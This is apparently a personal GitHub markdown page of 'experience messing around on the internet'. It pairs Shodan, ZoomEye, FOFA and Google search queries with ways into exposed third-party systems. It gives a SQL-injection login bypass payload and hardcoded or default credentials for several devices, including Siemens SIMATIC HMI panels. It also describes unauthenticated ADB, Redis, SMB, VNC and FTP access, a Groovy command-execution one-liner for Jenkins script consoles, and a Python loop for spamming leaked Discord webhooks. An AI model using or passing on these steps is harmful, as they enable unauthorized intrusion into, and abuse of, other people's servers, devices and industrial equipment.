# Table of contents
* [Admin login panels vulnerable to SQLi](https://github.com/komodoooo/Some-things/blob/main/papers.md#Admin-login-panels-vulnerable-to-SQLi)
* [Algo hardcoded password](https://github.com/komodoooo/Some-things/blob/main/papers.md#Algo-hardcoded-password)
* [Android debug bridge misconfiguration](https://github.com/komodoooo/Some-things/blob/main/papers.md#Android-debug-bridge-misconfiguration)
* [BigAnt Admin hardcoded password](https://github.com/komodoooo/Some-things/blob/main/papers.md#BigAnt-Admin-hardcoded-password)
* [Find exposed discord webhooks](https://github.com/komodoooo/Some-things/blob/main/papers.md#Find-exposed-discord-webhooks)
* [FTP servers with anonymous login allowed ](https://github.com/komodoooo/Some-things/blob/main/papers.md#FTP-servers-with-anonymous-login-allowed)
* [Fujitsu IP series hardcoded credentials](https://github.com/komodoooo/Some-things/blob/main/papers.md#Fujitsu-IP-series-hardcoded-credentials)
* [Jenkins code execution](https://github.com/komodoooo/Some-things/blob/main/papers.md#Jenkins-code-execution)
* [LG Signage default credentials](https://github.com/komodoooo/Some-things/blob/main/papers.md#LG-Signage-default-credentials)
* [Redis auth free access](https://github.com/komodoooo/Some-things/blob/main/papers.md#Redis-auth-free-access)
* [SIMATIC HMI_Panel default credentials](https://github.com/komodoooo/Some-things/blob/main/papers.md#SIMATIC-HMI_Panel-default-credentials)
* [SMB server misconfiguration](https://github.com/komodoooo/Some-things/blob/main/papers.md#SMB-server-misconfiguration)
* [VNC Servers with auth disabled](https://github.com/komodoooo/Some-things/blob/main/papers.md#VNC-Servers-with-auth-disabled)
<br><br>_"A bit of my experience about messing around on the internet"_<br><br>

# Admin login panels vulnerable to SQLi
Payload: _`1'or'1'='1`_
### Google dork
[`intitle:"Login" inurl:/admin/index.php`](https://www.google.com/search?q=intitle%3A%22Login%22+inurl%3A%2Fadmin%2Findex.php)
# Algo hardcoded password
### Login
Default password: _`algo`_
### Shodan query
[`http.favicon.hash:-1024590169`](https://www.shodan.io/search?query=http.favicon.hash%3A-1024590169)
# Android debug bridge misconfiguration
### installing ADB
Debian: `apt install android-tools`

Arch: `pacman -S android-tools`
### Connect to ADB device
**Use [this bash script](https://github.com/komodoooo/Some-things/blob/main/tools/adb/adb.sh)** or connect manually (default port is 5555)
### Shodan query
[`"Android debug bridge (ADB)" -Authentication`](https://www.shodan.io/search?query=%22Android+debug+bridge+%28ADB%29%22+-Authentication)
# BigAnt Admin hardcoded password
### Login
Default password: _`123456`_
### Zoomeye dork
[`"password: <span style=\"color:red\">123456</span>"`](https://www.zoomeye.org/searchResult?q=%22password%5C%3A%20%3Cspan%20style%3D%5C%22color%5C%3Ared%5C%22%3E123456%3C%2Fspan%3E%22)
# Find exposed discord webhooks
Simplest way to spam into a webhook in python:
```py
while True: __import__("requests").post("<webhook>", data={"content":"@here hey"})
```
### Zoomeye dork
[`"https://discord.com/api/webhooks/"`](https://www.zoomeye.org/searchResult?q=%22https%5C%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F%22)
#### But... Can i automate this?
The answer is obviously yes, i made [this](https://github.com/komodoooo/discord-stuff/blob/main/src/zw.py) script.
# FTP servers with anonymous login allowed 
Username: _`anonymous`_

Password: _`guest`_
### Shodan query
[`port:21 "Login successful" "FTP server ready"`](https://www.shodan.io/search?query=port%3A21+%22Login+successful%22+%22FTP+server+ready%22)
[`port:21 "Login successful"`](https://www.shodan.io/search?query=port%3A21+%22Login+successful%22)
## Find exposed ftp servers on google
### Google dork
[`intitle:"index of" inurl:ftp`](https://www.google.com/search?q=intitle%3A%22index+of%22+inurl%3Aftp)
# Fujitsu IP series hardcoded credentials

Username: _`fedish264pro`_ **OR** _`fedish265pro`_

Password: _`h264pro@broadsight`_ **OR** _`h265pro@broadsight`_
###### (Well known as CVE-2023-38433)
### FOFA query
[`"Server: thttpd/2.25b 29dec2003" && "Content-Length: 1133"`](https://en.fofa.info/result?qbase64=IlNlcnZlcjogdGh0dHBkLzIuMjViIDI5ZGVjMjAwMyIgJiYgIkNvbnRlbnQtTGVuZ3RoOiAxMTMzIg%3D%3D)
# Jenkins code execution
Select _`Manage Jenkins` > `Console Script`_ (Generally **/script** or **/manage/script**)

Groovy oneliner for injecting system commands:

```groovy
println("<your cmd>".execute().text)
```
###  Zoomeye dork
[`title:"Dashboard [Jenkins]"+"Manage jenkins"`](https://www.zoomeye.org/searchResult?q=title%3A%22Dashboard%20%5BJenkins%5D%22%2B%22Manage%20jenkins%22)
# LG Signage default credentials
### Login
Default password: _`00000000`_
### Zoomeye dork
[`iconhash:79487298 && title:"LG Signage"`](https://www.zoomeye.org/searchResult?q=iconhash%3A79487298%20title%3A%22LG%20Signage%22&t=all)
# Redis auth free access
### Install [redis-cli](https://redis.io/docs/install/install-redis/)
### Connecting
`redis-cli -h <ip>`
### Shodan query
[`product:redis "db0"`](https://www.shodan.io/search?query=product%3Aredis+%22db0%22)
# SIMATIC HMI_Panel default credentials
### Login
Default username: _`Administrator`_

Default password: _`100`_
### Google dork
[`intitle:"Miniweb Start Page"`](https://www.google.com/search?q=intitle%3A%E2%80%9DMiniweb+Start+Page%E2%80%9D)
# SMB server misconfiguration
### installing smbclient
Debian: `apt install samba`

Arch: `pacman -S smbclient`
### login in to misconfigurated server
`smbclient -N \\\\{address}\\Users`
### Shodan query
[`port:445 "Authentication: disabled" "Users"`](https://www.shodan.io/search?query=port%3A445+%22Authentication%3A+disabled%22+%22Users%22)
# VNC Servers with auth disabled
Download **[Vnc viewer](https://www.realvnc.com/en/connect/download/viewer/)**
Insert the IP address and port (default is 5900) and connect,

select ok when unencrypted connection warning appears.
### Shodan query
[`hash:1569903015`](https://www.shodan.io/search?query=hash%3A1569903015)
